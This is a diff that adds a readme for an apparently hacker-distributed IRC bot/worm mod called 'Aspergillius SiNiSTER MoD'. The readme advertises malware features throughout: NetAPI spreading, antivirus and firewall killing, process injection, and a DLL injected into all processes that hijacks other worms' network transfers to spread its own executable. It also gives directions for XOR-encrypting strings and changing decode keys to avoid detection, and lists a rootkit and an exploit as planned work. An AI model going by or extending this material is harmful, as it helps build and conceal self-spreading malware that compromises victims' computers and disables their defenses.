@@ -1,0 +1,24 @@
+Aspergillius SiNiSTER MoD
+
+Features:
+Netapi [WORKING]
+Sym [???]
+AV/FW kill [UNDTECTED]
+PROCESS INJECTION
+WorMRIDE:
+Automatically starts with bot,
+injects wormride dll aka mrtmon.dll into all procs
+detects strings xfered over winsock to remote computers indicating bot/worm spreading and replaces them with our own resulting in xfer of our own exec. Modified to support wormride xfers over ftp and cftp. Modify rider.cpp with appropriate strings. Use strings1.cfg and xor.exe to encrypte strings or change botfilename. Cftp host is NOT encrpted, tho username and password must be encrypted. Make sure you change the decode keys in rider.cpp and shared.h (in bot). 
+
+
+
+!!!WARNING!!!
+IF YOU CHANGE DECODE KEY IN BOTFILES YOU MUST REPLACE ALL AV/FW KILL STRINGS IN AV/FW KILL MODULE. STRINGS123.cfg contains all of the unencrypted strings, encrype them with the same decode key you're using for the rest of the bot.
+
+
+TODO:
+Encrypted irc communications
+Rootkit
+Imspread
+Myudf exploit   //Won't be long untill next release!!!
+ 
